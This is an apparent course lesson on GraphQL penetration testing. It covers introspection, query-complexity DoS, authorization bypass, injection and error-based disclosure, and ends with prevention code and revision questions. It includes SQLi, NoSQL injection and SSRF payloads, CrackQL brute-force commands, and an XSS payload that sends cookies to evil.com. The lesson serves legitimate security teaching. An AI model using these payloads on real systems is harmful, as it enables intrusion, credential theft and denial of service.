# Unit 11: API Security Testing - Topic 5: GraphQL Security

## Overview

GraphQL is a query language and runtime for APIs that allows clients to request exactly the data they need. While this flexibility is powerful for developers, it introduces unique security challenges including **introspection abuse**, **query complexity attacks**, **authorization bypass**, **injection**, and **information disclosure**. GraphQL's single-endpoint architecture and self-documenting nature make it an attractive target for attackers. Understanding GraphQL-specific attack vectors is essential for modern API penetration testing.

---

## 1. GraphQL Fundamentals

### How GraphQL Differs from REST

```
REST API:
GET  /api/users/1                    → User data
GET  /api/users/1/posts              → User's posts
GET  /api/users/1/posts/5/comments   → Post comments
= 3 separate HTTP requests

GraphQL API:
POST /graphql
query {
  user(id: 1) {
    name
    email
    posts {
      title
      comments {
        text
        author { name }
      }
    }
  }
}
= 1 request, exact data needed
```

### GraphQL Operations

| Operation | Purpose | Example |
|-----------|---------|---------|
| **Query** | Read data | `query { users { name } }` |
| **Mutation** | Write/modify data | `mutation { createUser(name: "test") { id } }` |
| **Subscription** | Real-time updates | `subscription { newMessage { text } }` |

### GraphQL Request Structure

```http
POST /graphql HTTP/1.1
Host: target.com
Content-Type: application/json
Authorization: Bearer eyJ...

{
  "query": "query { user(id: 1) { name email } }",
  "variables": { "id": 1 },
  "operationName": "GetUser"
}
```

---

## 2. GraphQL Introspection

### Exploiting Introspection

Introspection allows querying the schema itself — discovering all types, fields, and operations.

```graphql
# Full introspection query - reveals entire schema
query IntrospectionQuery {
  __schema {
    queryType { name }
    mutationType { name }
    subscriptionType { name }
    types {
      name
      kind
      description
      fields(includeDeprecated: true) {
        name
        description
        args {
          name
          type { name kind }
          defaultValue
        }
        type {
          name
          kind
          ofType { name kind }
        }
        isDeprecated
        deprecationReason
      }
      inputFields {
        name
        type { name kind }
        defaultValue
      }
      enumValues(includeDeprecated: true) {
        name
        description
      }
    }
    directives {
      name
      description
      locations
      args {
        name
        type { name kind }
        defaultValue
      }
    }
  }
}
```

### Quick Introspection Probes

```bash
# Simple schema check
curl -s -X POST http://target.com/graphql \
  -H "Content-Type: application/json" \
  -d '{"query": "{ __schema { types { name } } }"}'

# List all types
curl -s -X POST http://target.com/graphql \
  -H "Content-Type: application/json" \
  -d '{"query": "{ __schema { types { name kind description } } }"}'

# Get fields for a specific type
curl -s -X POST http://target.com/graphql \
  -H "Content-Type: application/json" \
  -d '{"query": "{ __type(name: \"User\") { fields { name type { name } } } }"}'

# List all queries
curl -s -X POST http://target.com/graphql \
  -H "Content-Type: application/json" \
  -d '{"query": "{ __schema { queryType { fields { name args { name type { name } } } } } }"}'

# List all mutations
curl -s -X POST http://target.com/graphql \
  -H "Content-Type: application/json" \
  -d '{"query": "{ __schema { mutationType { fields { name args { name type { name } } } } } }"}'

# If introspection is disabled, try __type probe
curl -s -X POST http://target.com/graphql \
  -H "Content-Type: application/json" \
  -d '{"query": "{ __type(name: \"Query\") { name } }"}'
```

### Introspection Visualization Tools

```bash
# GraphQL Voyager - Interactive schema visualization
# https://graphql-kit.com/graphql-voyager/
# Paste introspection result → visual schema map

# InQL (Burp Extension)
# 1. Install InQL from BApp Store
# 2. Point at GraphQL endpoint
# 3. Automatically generates:
#    - Schema documentation
#    - Query templates
#    - Attack payloads

# GraphQL Map
git clone https://github.com/swisskyrepo/GraphQLmap
python3 graphqlmap.py -u http://target.com/graphql

# Clairvoyance - Schema discovery when introspection is disabled
pip install clairvoyance
clairvoyance http://target.com/graphql -o schema.json
# Uses field suggestion errors to reconstruct schema!
```

---

## 3. Query Complexity Attacks (DoS)

### Deeply Nested Queries

```graphql
# Circular relationship exploitation
# If User → Posts → Author (User) → Posts → Author...

query {
  users {
    posts {
      author {
        posts {
          author {
            posts {
              author {
                posts {
                  author {
                    name  # 5 levels deep!
                  }
                }
              }
            }
          }
        }
      }
    }
  }
}
# This can cause exponential database queries!
# Each level multiplies the number of queries
```

### Query Batching Attack

```bash
# Send multiple queries in a single request
curl -X POST http://target.com/graphql \
  -H "Content-Type: application/json" \
  -d '[
    {"query": "{ user(id: 1) { name } }"},
    {"query": "{ user(id: 2) { name } }"},
    {"query": "{ user(id: 3) { name } }"},
    ...
    {"query": "{ user(id: 10000) { name } }"}
  ]'

# Can be used for:
# - Brute forcing (try many IDs)
# - DoS (overwhelm server)
# - Bypass rate limiting (one HTTP request, many queries)
```

### Field Duplication Attack

```graphql
# Alias-based field duplication
query {
  a1: user(id: 1) { name }
  a2: user(id: 2) { name }
  a3: user(id: 3) { name }
  # ... hundreds of aliases
  a1000: user(id: 1000) { name }
}
# Single query returns 1000 users!
# May bypass per-query rate limiting
```

### Fragment-Based Complexity

```graphql
# Using fragments to increase complexity
fragment UserFields on User {
  name
  email
  posts {
    title
    comments { text }
  }
}

query {
  u1: user(id: 1) { ...UserFields }
  u2: user(id: 2) { ...UserFields }
  u3: user(id: 3) { ...UserFields }
  # Each fragment expands to full subquery
}
```

---

## 4. Authorization Bypass

### Object-Level Authorization in GraphQL

```graphql
# Test accessing other users' data
query {
  user(id: 2) {  # Not my user ID!
    name
    email
    password  # Might return hashed password
    ssn       # PII exposure
    orders {
      total
      items { name }
    }
  }
}

# Test accessing admin-only fields
query {
  user(id: 1) {
    name
    role          # Can I see my role?
    apiKey        # Can I see API keys?
    internalNotes # Internal data?
  }
}

# Test admin mutations as regular user
mutation {
  deleteUser(id: 2) {
    success
  }
}

mutation {
  updateUserRole(id: 1, role: ADMIN) {
    id
    role
  }
}

mutation {
  createAdmin(name: "hacker", email: "hack@evil.com") {
    id
    token
  }
}
```

### Discovering Hidden Fields

```graphql
# If introspection is disabled, use field suggestion
query {
  user(id: 1) {
    name
    passwor    # Typo → error may suggest "password"
  }
}
# Error: "Did you mean 'password'?"
# This reveals the field exists!

# Systematic field discovery
# Try common field names:
query {
  user(id: 1) {
    name
    email
    password
    password_hash
    passwordHash
    token
    apiKey
    api_key
    secret
    ssn
    creditCard
    credit_card
    role
    isAdmin
    is_admin
    admin
    permissions
    internalId
    internal_id
  }
}
```

---

## 5. GraphQL Injection

### SQL Injection via GraphQL

```graphql
# GraphQL passes arguments to resolvers
# If resolvers use raw SQL, injection is possible

# SQLi in query arguments
query {
  user(name: "admin' OR '1'='1") {
    id
    name
    email
  }
}

# SQLi in search
query {
  searchUsers(query: "' UNION SELECT username, password FROM users--") {
    name
    email
  }
}

# SQLi in mutation
mutation {
  login(username: "admin' OR '1'='1'--", password: "anything") {
    token
  }
}

# NoSQL injection
query {
  user(id: "{\"$gt\": \"\"}") {
    name
    email
  }
}
```

### XSS via GraphQL

```graphql
# Store XSS payload via mutation
mutation {
  updateProfile(
    name: "<script>document.location='http://evil.com/steal?c='+document.cookie</script>"
  ) {
    id
    name
  }
}

# If the name is rendered without sanitization in the frontend → XSS
```

### SSRF via GraphQL

```graphql
# If GraphQL has URL-fetching resolvers
mutation {
  importProfile(url: "http://169.254.169.254/latest/meta-data/") {
    data
  }
}

query {
  fetchUrl(url: "http://127.0.0.1:6379/") {
    content
  }
}
```

---

## 6. Information Disclosure

### Error-Based Information Leakage

```graphql
# Trigger errors to reveal information
query {
  user(id: "not_a_number") {
    name
  }
}
# Error: "Argument 'id' must be Int. Got String."
# Reveals: id is integer type

# Invalid field
query {
  user(id: 1) {
    nonexistent_field
  }
}
# Error: "Cannot query field 'nonexistent_field' on type 'User'. 
#  Did you mean 'name', 'email', 'password_hash'?"
# Reveals: field names via suggestions!

# Stack trace exposure
query {
  user(id: null) {
    name
  }
}
# Error may include stack trace, database info, file paths
```

### Debug Mode Detection

```graphql
# Check for debug/development mode
query {
  __schema { types { name } }
}
# If introspection works in production → security issue

# Check for detailed errors
query {
  _debug { 
    queries { sql duration }
  }
}

# Check for GraphiQL/Playground
# Browse to:
# /graphiql
# /graphql/playground
# /graphql/console
# /graphql/explorer
```

---

## 7. GraphQL Security Testing Tools

### Comprehensive Tool List

| Tool | Purpose | Usage |
|------|---------|-------|
| **InQL** | Burp extension, schema analysis | Automated testing in Burp |
| **GraphQL Voyager** | Schema visualization | Visual attack surface mapping |
| **GraphQLmap** | Automated exploitation | CLI-based testing |
| **Clairvoyance** | Schema discovery (no introspection) | Blind schema enumeration |
| **BatchQL** | Batch query testing | DoS and brute force |
| **graphql-cop** | Security audit | Quick security checks |
| **CrackQL** | Brute force via GraphQL | Credential testing |

### graphql-cop (Quick Security Audit)

```bash
# Install
pip3 install graphql-cop

# Run security audit
graphql-cop -t http://target.com/graphql

# Checks for:
# - Introspection enabled
# - Query batching allowed
# - Field suggestions enabled
# - GET method queries
# - Debug mode
# - Mutation accessible without auth
```

### GraphQLmap Usage

```bash
# Interactive mode
python3 graphqlmap.py -u http://target.com/graphql

# Commands:
# dump_new      - Dump schema via introspection
# dump_old      - Dump schema (older method)
# nosqli        - Test NoSQL injection
# sqli          - Test SQL injection
# exec          - Execute custom query

# Automated SQL injection testing
python3 graphqlmap.py -u http://target.com/graphql \
  --method POST --sqli \
  --field "user(name: \"INJECT\")"
```

### CrackQL (Brute Force via GraphQL)

```bash
# Install
pip3 install crackql

# Brute force login via GraphQL mutation
crackql -t http://target.com/graphql \
  -q 'mutation { login(username: "admin", password: "§password§") { token } }' \
  -i passwords.txt

# Uses aliased queries to send many attempts in one request
# Bypasses per-request rate limiting
```

---

## 8. Prevention Techniques

### GraphQL Security Best Practices

```javascript
// 1. Disable introspection in production
const server = new ApolloServer({
  typeDefs,
  resolvers,
  introspection: process.env.NODE_ENV !== 'production',
  playground: false,  // Disable GraphiQL
});

// 2. Query depth limiting
const depthLimit = require('graphql-depth-limit');
const server = new ApolloServer({
  validationRules: [depthLimit(5)],  // Max 5 levels deep
});

// 3. Query complexity analysis
const { createComplexityLimitRule } = require('graphql-validation-complexity');
const server = new ApolloServer({
  validationRules: [
    createComplexityLimitRule(1000, {
      scalarCost: 1,
      objectCost: 10,
      listFactor: 20,
    }),
  ],
});

// 4. Rate limiting per query
const rateLimit = require('graphql-rate-limit');
const rateLimitDirective = rateLimit({
  identifyContext: (ctx) => ctx.user.id,
});

// 5. Disable field suggestions
const server = new ApolloServer({
  formatError: (err) => {
    // Remove field suggestion hints
    if (err.message.startsWith('Cannot query field')) {
      return new Error('Invalid field');
    }
    return err;
  },
});

// 6. Batch query limiting
// Reject or limit array queries
app.use('/graphql', (req, res, next) => {
  if (Array.isArray(req.body)) {
    if (req.body.length > 5) {
      return res.status(400).json({ error: 'Too many queries' });
    }
  }
  next();
});
```

### Prevention Checklist

| Control | Implementation |
|---------|---------------|
| **Disable introspection** | Production should not expose schema |
| **Depth limiting** | Limit query nesting depth (5-10 levels) |
| **Complexity analysis** | Score and limit query complexity |
| **Batch limiting** | Limit number of queries per request |
| **Field whitelisting** | Only expose necessary fields |
| **Authorization per field** | Check permissions on each resolver |
| **Input validation** | Validate and sanitize all arguments |
| **Rate limiting** | Per-user, per-query rate limits |
| **Error handling** | Generic errors, no field suggestions |
| **Persisted queries** | Only allow pre-approved queries |
| **Timeout** | Set query execution timeout |
| **Monitoring** | Log and alert on complex/suspicious queries |

---

## Summary Table

| Concept | Key Points |
|---------|------------|
| **Introspection** | Self-documenting schema; disable in production |
| **Complexity Attacks** | Nested queries, batching, aliases cause DoS |
| **Auth Bypass** | Test object-level and field-level authorization |
| **Injection** | SQLi, NoSQLi via resolver arguments |
| **Info Disclosure** | Field suggestions, error messages, debug mode |
| **Tools** | InQL, GraphQLmap, Clairvoyance, CrackQL, graphql-cop |
| **Prevention** | Depth limit, complexity limit, disable introspection, rate limit |

---

## Revision Questions

1. What is GraphQL introspection and why should it be disabled in production? How can an attacker use it?
2. Explain how nested query attacks can cause denial of service. What is the solution?
3. How does authorization in GraphQL differ from REST APIs? What are the challenges?
4. Describe how CrackQL uses query aliasing to bypass rate limiting during brute force attacks.
5. What is Clairvoyance and how does it discover GraphQL schemas even when introspection is disabled?
6. Design a secure GraphQL API configuration — list at least 6 security controls you would implement.

---

*Previous: [04-api-specific-vulnerabilities.md](04-api-specific-vulnerabilities.md) | Next: [06-rest-api-testing.md](06-rest-api-testing.md)*

---

*[Back to README](../README.md)*
